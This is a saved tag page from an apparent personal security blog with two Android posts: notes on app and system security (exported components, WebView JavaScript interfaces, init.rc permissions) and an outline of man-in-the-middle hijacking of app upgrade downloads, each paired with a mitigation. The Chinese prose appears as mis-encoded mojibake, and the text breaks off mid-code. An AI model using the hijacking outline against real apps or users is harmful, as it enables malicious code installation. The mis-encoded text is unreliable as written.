<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: android - buffer0verflooow - Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="buffer0verflooow - Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="buffer0verflooow - Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="buffer0verflooow - Blog"><meta property="og:url" content="https://buffer0verflooow.github.io/"><meta property="og:site_name" content="buffer0verflooow - Blog"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://buffer0verflooow.github.io/img/og_image.png"><meta property="article:author" content="buffer0verflooow"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://buffer0verflooow.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://buffer0verflooow.github.io"},"headline":"buffer0verflooow - Blog","image":["https://buffer0verflooow.github.io/img/og_image.png"],"author":{"@type":"Person","name":"buffer0verflooow"},"publisher":{"@type":"Organization","name":"buffer0verflooow - Blog","logo":{"@type":"ImageObject","url":"https://buffer0verflooow.github.io/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">android</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-07-30T07:29:09.000Z" title="2022/7/30 15:29:09">2022-07-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-11-30T07:39:15.323Z" title="2022/11/30 15:39:15">2022-11-30</time></span><span class="level-item">8 minutes read (About 1212 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Androidå®‰å…¨ç¬”è®°</a></p><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ•´ç†ä¸€ä¸‹ Android APPå®‰å…¨ç›¸å…³çš„ç¬”è®°ï¼Œæœ‰äº›æ˜¯å·²ç»çŸ¥é“äº†çš„ï¼Œä½†æ˜¯æ²¡æœ‰å»ç³»ç»Ÿçš„è®°å½•æ¢³ç†ã€‚</p>
<h1 id="å®‰å…¨é—®é¢˜åˆ†ç±»"><a href="#å®‰å…¨é—®é¢˜åˆ†ç±»" class="headerlink" title="å®‰å…¨é—®é¢˜åˆ†ç±»"></a>å®‰å…¨é—®é¢˜åˆ†ç±»</h1><h2 id="å››å¤§ç»„ä»¶"><a href="#å››å¤§ç»„ä»¶" class="headerlink" title="å››å¤§ç»„ä»¶"></a>å››å¤§ç»„ä»¶</h2><p>Androidçš„å››å¤§ç»„ä»¶æœ‰ä¸¤ç§å¯¹å¤–å¼€æ”¾çš„æ–¹å¼ï¼š</p>
<ul>
<li><ol>
<li>é€šè¿‡åœ¨<code>manifest</code>æ–‡ä»¶ä¸­å£°æ˜<code>exported=true</code>ï¼›</li>
</ol>
</li>
<li><ol start="2">
<li>å¦‚æœæ²¡æœ‰1ä¸­çš„å£°æ˜ï¼Œå¯ä»¥é€šè¿‡éšå¼çš„Intentè¿›è¡Œè®¿é—®ã€‚<br>å½±å“ï¼šå…¶ä»–ç¨‹åºå¯ä»¥è¿›è¡ŒåŠ«æŒï¼Œå¦‚æœå¯¹ä¼ å…¥çš„Intentæ•°æ®å¤„ç†ä¸å¤Ÿï¼Œæœ‰å¯èƒ½å¯¼è‡´Dosæ”»å‡»ã€‚<br>è§£å†³æ–¹æ¡ˆï¼šæ˜¾ç¤ºå£°æ˜<code>exported=false</code>ï¼Œæˆ–è€…æŒ‡å®šIntentçš„ç±»ï¼Œæˆ–è€…å¯¹æƒé™è¿›è¡Œé™åˆ¶ã€‚</li>
</ol>
</li>
</ul>
<h2 id="Webview"><a href="#Webview" class="headerlink" title="Webview"></a>Webview</h2><p>Android4.4ä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡jsæ³¨å…¥è·å–å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsToJava</span>(), <span class="string">&quot;myjsfunction&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>4.4ä¹‹åéœ€è¦åŠ å…¥@JavascriptInterfaceæ³¨è§£ã€‚</p>
<h2 id="APPæµé‡è¯·æ±‚é—®é¢˜"><a href="#APPæµé‡è¯·æ±‚é—®é¢˜" class="headerlink" title="APPæµé‡è¯·æ±‚é—®é¢˜"></a>APPæµé‡è¯·æ±‚é—®é¢˜</h2><p>ä¸»è¦æ˜¯æŒ‡APPä½¿ç”¨äº†HTTPï¼Œæˆ–è€…æ˜¯HTTPSçš„è¯ä¹¦æ ¡éªŒä¸å¤Ÿï¼Œå¯¼è‡´å¯ä»¥è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œå…¶å®å°±æ˜¯å»å®ç°Androidçš„æŠ“åŒ…åˆ†æï¼Œå…·ä½“å¯ä»¥çœ‹ã€ŠAndroidä¸­é—´äººæ”»å‡»æ–¹æ³•æ•´ç†ã€‹è¿™ç¯‡ç¬”è®°ã€‚</p>
<h1 id="Androidç³»ç»Ÿå®‰å…¨çŸ¥è¯†"><a href="#Androidç³»ç»Ÿå®‰å…¨çŸ¥è¯†" class="headerlink" title="Androidç³»ç»Ÿå®‰å…¨çŸ¥è¯†"></a>Androidç³»ç»Ÿå®‰å…¨çŸ¥è¯†</h1><p>Androidå®‰å…¨ä¸»è¦ç”±ç³»ç»Ÿæ¡†æ¶å®ç°ã€å¼€å‘è€…æ„å»ºè®¾è®¡å’Œç”¨æˆ·æˆæƒä¸‰ä¸ªéƒ¨åˆ†ã€‚<br>Androidå®‰å…¨è®¾è®¡ç†å¿µï¼šåº”ç”¨ç¨‹åºä¸åº”è¯¥æŸå®³æ“ä½œç³»ç»Ÿèµ„æºã€ç”¨æˆ·å’Œå…¶ä»–åº”ç”¨ç¨‹åºã€‚å› æ­¤Androidå®ç°äº†ä¸¤ä¸ªå±‚æ¬¡çš„å®‰å…¨æœºåˆ¶ï¼š</p>
<ul>
<li><ol>
<li>Linuxå±‚ï¼šä¸ºæ¯ä¸ªåº”ç”¨ç¨‹åºåˆ†é…å•ç‹¬çš„ Unix ç”¨æˆ·ï¼ˆUIDï¼‰å’Œç»„ï¼ˆGIDï¼‰æ ‡è¯†ç¬¦ã€‚å¼ºåˆ¶åœ¨å•ç‹¬çš„ Linux è¿›ç¨‹ä¸­è¿è¡Œæ¯ä¸ªåº”ç”¨ç¨‹åºã€‚</li>
</ol>
<ul>
<li>1.1 Android ä¸­æœ‰ä¸€äº›åœ°æ–¹å¯ä»¥ç”¨äºè®¾ç½®æ–‡ä»¶ã€é©±åŠ¨å’Œ Unix å¥—æ¥å­—çš„æ–‡ä»¶ç³»ç»Ÿæƒé™ï¼šinitç¨‹åºã€init.rcé…ç½®æ–‡ä»¶ã€ueventd.rcé…ç½®æ–‡ä»¶å’Œç³»ç»Ÿ ROM æ–‡ä»¶ç³»ç»Ÿé…ç½®æ–‡ä»¶ã€‚</li>
</ul>
</li>
<li><ol start="2">
<li>æ¡†æ¶å±‚ï¼šinitè¿›ç¨‹ï¼Œä½äº Android æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ä¸­ï¼Œè´Ÿè´£åˆ›å»ºæ–‡ä»¶ç³»ç»ŸåŸºæœ¬æ¡ç›®ï¼Œç¨‹åºè§£æ<code>init.rc</code>é…ç½®æ–‡ä»¶å¹¶æ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ã€‚<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">( <span class="type">int</span> argc, <span class="type">char</span> **argv )</span> </span><br><span class="line"> 2 &#123; </span><br><span class="line"> <span class="number">3</span>   ... </span><br><span class="line"> <span class="number">4</span>   <span class="keyword">if</span> (!<span class="built_in">strcmp</span> (basename( argv[<span class="number">0</span>] ), <span class="string">&quot;ueventd&quot;</span>) ) </span><br><span class="line"> <span class="number">5</span>     <span class="keyword">return</span> ueventd_main ( argc, argv ) ; </span><br><span class="line"> <span class="number">6</span>   ... </span><br><span class="line"> <span class="number">7</span>   mkdir(<span class="string">&quot;/dev&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"> <span class="number">8</span>   mkdir(<span class="string">&quot;/proc&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"> <span class="number">9</span>   mkdir(<span class="string">&quot;/sys&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span>   mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, MS_NOSUID, <span class="string">&quot;mode=0755&quot;</span>) ; </span><br><span class="line"><span class="number">12</span>   mkdir(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">13</span>   mkdir(<span class="string">&quot;/dev/socket&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">14</span>   mount(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">15</span>   mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">16</span>   mount(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;/sys&quot;</span>, <span class="string">&quot;sysfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">17</span>   ... </span><br><span class="line"><span class="number">18</span>   init_parseconfig_file(<span class="string">&quot;/init.rc&quot;</span>) ; </span><br><span class="line"><span class="number">19</span>   ... </span><br><span class="line"><span class="number">20</span> &#125;</span><br></pre></td></tr></table></figure>
<code>init.rc</code>é…ç½®æ–‡ä»¶ä½¿ç”¨ä¸€ç§ç§°ä¸º Android Init Language çš„è¯­è¨€ç¼–å†™ï¼Œä½äºæ ¹ç›®å½•ä¸‹ã€‚åœ¨<code>init.rc</code>é…ç½®æ–‡ä»¶ä¸­ç¼–å†™çš„å‘½ä»¤å®šä¹‰ç³»ç»Ÿå…¨å±€å˜é‡ï¼Œä¸ºå†…å­˜ç®¡ç†è®¾ç½®åŸºæœ¬å†…æ ¸å‚æ•°ï¼Œé…ç½®æ–‡ä»¶ç³»ç»Ÿï¼Œå¯åŠ¨å‡ ä¸ªå®ˆæŠ¤è¿›ç¨‹å’Œè¿›ç¨‹ï¼ˆä¸ä¼šå®Œå…¨ç»§æ‰¿initçš„rootæƒé™ï¼‰ï¼Œæ›´é‡è¦çš„æ˜¯è´Ÿè´£åŸºæœ¬æ–‡ä»¶ç³»ç»Ÿç»“æ„çš„åˆ›å»ºï¼Œå¹¶ä¸ºåˆ›å»ºçš„èŠ‚ç‚¹åˆ†é…æ‰€æœ‰è€…å’Œæ–‡ä»¶ç³»ç»Ÿæƒé™ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 on fs </span><br><span class="line">2   <span class="comment"># mount mtd partitions </span></span><br><span class="line">3   <span class="comment"># Mount /system rw first to give the filesystem a chance to save a checkpoint </span></span><br><span class="line">4   mount yaffs2 mtd@system /system </span><br><span class="line">5   mount yaffs2 mtd@system /system ro remount </span><br><span class="line">6   mount yaffs2 mtd@userdata /data nosuid nodev </span><br><span class="line">7   mount yaffs2 mtd@cache /cache nosuid nodev</span><br></pre></td></tr></table></figure>
ç¬¬ä¸€ä¸ªæ´¾ç”Ÿè‡ªinitçš„å®ˆæŠ¤è¿›ç¨‹æ˜¯ueventdå®ˆæŠ¤è¿›ç¨‹ï¼Œé€šè¿‡è¯»å–<code>ueventd.rc</code>å’Œ<code>ueventd.[device name].rc</code>é…ç½®æ–‡ä»¶ï¼Œé‡æ”¾æŒ‡å®šçš„å†…æ ¸<code>uevent_hotplug</code>äº‹ä»¶ã€‚ è¿™äº›äº‹ä»¶è®¾ç½®äº†ä¸åŒè®¾å¤‡çš„æ‰€æœ‰è€…å’Œæƒé™ã€‚ä¹‹åï¼Œå®ˆæŠ¤è¿›ç¨‹ç­‰å¾…ç›‘å¬æ‰€æœ‰æœªæ¥çš„çƒ­æ’æ‹”äº‹ä»¶ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 ...</span><br><span class="line">2 /dev/ashmem 0666 root root </span><br><span class="line">3 /dev/binder 0666 root root </span><br><span class="line">4 ...</span><br><span class="line">5 /dev/cam 0660 root camera </span><br><span class="line">6 ...</span><br></pre></td></tr></table></figure>
ç”±initç¨‹åºå¯åŠ¨çš„æ ¸å¿ƒæœåŠ¡ä¹‹ä¸€æ˜¯servicemanagerã€‚ æ­¤æœåŠ¡å……å½“åœ¨ Android ä¸­è¿è¡Œçš„æ‰€æœ‰æœåŠ¡çš„ç´¢å¼•ã€‚<br>initè¿›ç¨‹å¯åŠ¨çš„å¦ä¸€ä¸ªæ ¸å¿ƒè¿›ç¨‹æ˜¯ Zygoteã€‚è¿™ä¸ªä¸ç”¨å¤šè¯´ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒZygoteæ´¾ç”Ÿçš„æ–°è¿›ç¨‹çš„å†…å­˜å…·æœ‰â€œå†™æ—¶å¤åˆ¶â€ï¼ˆCOWï¼‰ä¿æŠ¤ï¼Œè¿™æ„å‘³ç€åªæœ‰å½“åè€…å°è¯•å†™å…¥å—ä¿æŠ¤çš„å†…å­˜æ—¶ï¼Œæ•°æ®æ‰ä¼šä» zygote è¿›ç¨‹å¤åˆ¶åˆ°æ–°è¿›ç¨‹ã€‚<br>initè¿˜ä¼šå¯åŠ¨å…¶ä»–çš„è¿›ç¨‹ï¼Œä¸å¤šè¯´äº†ã€‚</li>
</ol>
</li>
<li><ol start="3">
<li>Androidæƒé™ï¼Œå¦‚Systemæƒé™ç­‰ï¼Œç„¶ååˆåœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¯¹æƒé™çš„ç­‰çº§è¿›è¡Œäº†åˆ’åˆ†ï¼Œä¹Ÿå°±æ˜¯normalã€dangerousã€signatureå’ŒsignatureOrSystemã€‚ç³»ç»Ÿæƒé™çš„å®šä¹‰ä½äº<code>frameworks/base/core/res</code>ä¸­ã€‚</li>
</ol>
</li>
</ul>
<h1 id="ç»„ä»¶ç›¸å…³"><a href="#ç»„ä»¶ç›¸å…³" class="headerlink" title="ç»„ä»¶ç›¸å…³"></a>ç»„ä»¶ç›¸å…³</h1><ol>
<li><p>Activityåœ¨Manifestä¸­æœ‰ä¸€ä¸ªé…ç½®å«åšandroid:priority ï¼Œå³ä¼˜å…ˆçº§ã€‚è¿™ä¸ªé…ç½®åœ¨AOSPçš„ç³»ç»Ÿåº”ç”¨ä¸­å¾ˆå¸¸è§ï¼Œ<strong>å½“Intentå¯ä»¥resolveåˆ°å¤šä¸ªActivityæ—¶ï¼Œå¦‚æœå…¶ä¸­å­˜åœ¨é«˜ä¼˜å…ˆçº§çš„Activityåˆ™ä¼šè¢«ç›´æ¥é€‰æ‹©ï¼Œå¹¶ä¸ä¼šè§¦å‘ç”¨æˆ·é€‰æ‹©çš„æµç¨‹</strong>ã€‚</p>
</li>
<li><p>Intentæœ‰ä¸ªéå¸¸ç‰¹æ®Šçš„åœ°æ–¹ï¼Œ<strong>å³Componentå’ŒPackageæ˜¯ä¸¤ä¸ªäº’ä¸ç›¸å…³çš„å˜é‡</strong>ï¼Œåœ¨resolveä¸€ä¸ªIntentæ—¶ï¼ŒComponentçš„ä¼˜å…ˆçº§æ˜¯æœ€é«˜çš„ï¼Œå½“å®ƒè¢«è®¾ç½®æ—¶ï¼ŒmPackageä¼šè¢«ç›´æ¥å¿½ç•¥ã€‚</p>
</li>
</ol>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-07-20T12:35:56.000Z" title="2022/7/20 20:35:56">2022-07-20</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-07-29T14:27:24.318Z" title="2022/7/29 22:27:24">2022-07-29</time></span><span class="level-item">13 minutes read (About 1957 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Androidä¸­é—´äººæ”»å‡»æ–¹æ³•æ•´ç†</a></p><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™é‡Œçš„ç›®æ ‡æ˜¯æ±‡æ€»ä¸€äº›ï¼ŒAndroidå¹³å°ä¸Šçš„ï¼ŒåŸºäºä¸­é—´äººçš„ï¼Œç”¨äºæ¤å…¥æ¶æ„ä»£ç çš„æ”»å‡»æ–¹æ³•çš„ä¸€ä¸ªæ•´ç†ï¼Œä¹Ÿå¯ä»¥ç”¨äºå…¶ä»–å¹³å°ã€‚</p>
<p>èƒ½å¤Ÿè¿›è¡ŒåŠ«æŒï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯å› ä¸ºä½¿ç”¨äº†HTTPåè®®ã€‚åˆ©ç”¨çš„åŸºæœ¬æ€è·¯æ˜¯ï¼š</p>
<ol>
<li>éƒ¨ç½²ä¸­é—´äººè®¾å¤‡ï¼›</li>
<li>ç›‘å¬ç½‘ç»œæµé‡ï¼›</li>
<li>å½“ç›®æ ‡è¯·æ±‚æœåŠ¡å™¨æ—¶ï¼ŒåŠ«æŒè¯¥è¯·æ±‚ï¼Œå¹¶å“åº”æ¶æ„æ–‡ä»¶ã€‚</li>
</ol>
<p>å…·ä½“å¯ä»¥å‚è€ƒè¿™ä¸ª<a target="_blank" rel="noopener" href="https://patentimages.storage.googleapis.com/67/cf/11/ee5bb9a604a455/CN106936849A.pdf">ä¸“åˆ©</a>ã€‚</p>
<h1 id="APPå‡çº§è¿‡ç¨‹åŠ«æŒ"><a href="#APPå‡çº§è¿‡ç¨‹åŠ«æŒ" class="headerlink" title="APPå‡çº§è¿‡ç¨‹åŠ«æŒ"></a>APPå‡çº§è¿‡ç¨‹åŠ«æŒ</h1><p>APPç‰ˆæœ¬å‡çº§æ—¶ä¸€èˆ¬æ˜¯è¯·æ±‚å‡çº§æ¥å£ï¼Œå¦‚æœæœ‰å‡çº§ï¼ŒæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªä¸‹è½½åœ°å€ï¼Œä¸‹è½½å¥½APKåï¼Œå†ç‚¹å‡»å®‰è£…ã€‚å…¶ä¸­ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªåœ°æ–¹å¯ä»¥è¿›è¡ŒåŠ«æŒï¼Œè¯·æ±‚å‡çº§æ—¶ã€ä¸‹è½½æ–‡ä»¶æ—¶å’Œå®‰è£…æ—¶ã€‚</p>
<h2 id="è¯·æ±‚å‡çº§API"><a href="#è¯·æ±‚å‡çº§API" class="headerlink" title="è¯·æ±‚å‡çº§API"></a>è¯·æ±‚å‡çº§API</h2><p>å¦‚æœä½¿ç”¨çš„æ˜¯HTTPè¯·æ±‚ï¼Œå¯ä»¥è¿›è¡ŒåŠ«æŒï¼Œè¿”å›ä¸€ä¸ªæ¶æ„ä¸‹è½½åœ°å€ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šå»ºè®®ä½¿ç”¨HTTPSã€‚</p>
<h2 id="ä¸‹è½½API"><a href="#ä¸‹è½½API" class="headerlink" title="ä¸‹è½½API"></a>ä¸‹è½½API</h2><p>è¿˜æ˜¯HTTPè¯·æ±‚ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šHTTPSï¼Œå¯¹æœåŠ¡ç«¯è¿”å›çš„æ–‡ä»¶è¿›è¡Œhashæ ¡éªŒï¼Œ<em>è¿˜æœ‰æœåŠ¡ç«¯è¿”å›çš„keyè¿›è¡Œæ ¡éªŒ</em>ã€‚</p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>åœ¨å®‰è£…æ—¶ï¼Œå®‰è£…çš„æ–‡ä»¶è·¯å¾„è¢«ä¿®æ”¹äº†ï¼Œå¯èƒ½å®‰è£…äº†å…¶ä»–å¥‡æ€ªçš„ä¸œè¥¿ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šå¯¹APKæ–‡ä»¶è¿›è¡ŒåŒ…åå’Œç­¾åéªŒè¯ã€‚</p>
<h1 id="å®‰å…¨å¼€å‘çš„ä¾‹å­ğŸŒ°"><a href="#å®‰å…¨å¼€å‘çš„ä¾‹å­ğŸŒ°" class="headerlink" title="å®‰å…¨å¼€å‘çš„ä¾‹å­ğŸŒ°"></a>å®‰å…¨å¼€å‘çš„ä¾‹å­ğŸŒ°</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UpgradeModel</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line">    <span class="keyword">private</span> DataBean data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMsg</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMsg</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> DataBean <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">(DataBean data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DataBean</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String description;</span><br><span class="line">        <span class="keyword">private</span> String downUrl;</span><br><span class="line">        <span class="keyword">private</span> String version;</span><br><span class="line">        <span class="keyword">private</span> String hashcod;</span><br><span class="line">        <span class="keyword">private</span> String key;</span><br><span class="line">        <span class="keyword">private</span> String isForce;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> 